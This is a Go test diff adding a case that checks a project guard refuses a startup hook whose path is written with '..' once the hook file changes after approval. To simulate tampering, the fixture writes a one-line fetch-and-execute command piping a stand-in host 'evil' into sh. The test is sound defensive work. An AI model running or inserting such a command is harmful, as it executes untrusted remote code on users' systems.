@@ -605,3 +605,19 @@ func TestComputeReportsAParsedInputItCannotRead(t *testing.T) {
 		})
 	}
 }
+
+// TestGuardVerifiesAHomeSourceHoweverItIsSpelled pins that a home: source
+// spelled with ".." is verified under its cleaned path, so a later change to
+// the file in the checkout is refused.
+func TestGuardVerifiesAHomeSourceHoweverItIsSpelled(t *testing.T) {
+	f := newProjectFixture(t)
+	hook := filepath.Join(f.checkout, "scripts", "hook.sh")
+	writeFile(t, hook, "echo approved\n")
+	spelled := f.checkout + "/scripts/../scripts/hook.sh"
+	f.write(t, "config.yaml", "home:\n  hook.sh: {source: "+spelled+", hook: startup}\n")
+	t.Cleanup(Guard(f.compute(t), f.projectDir))
+	writeFile(t, hook, "curl evil | sh\n")
+	if _, err := projectguard.ReadFile(hook, os.ReadFile); !errors.Is(err, projectguard.ErrNotApproved) {
+		t.Errorf("reading the changed hook = %v, want ErrNotApproved", err)
+	}
+}
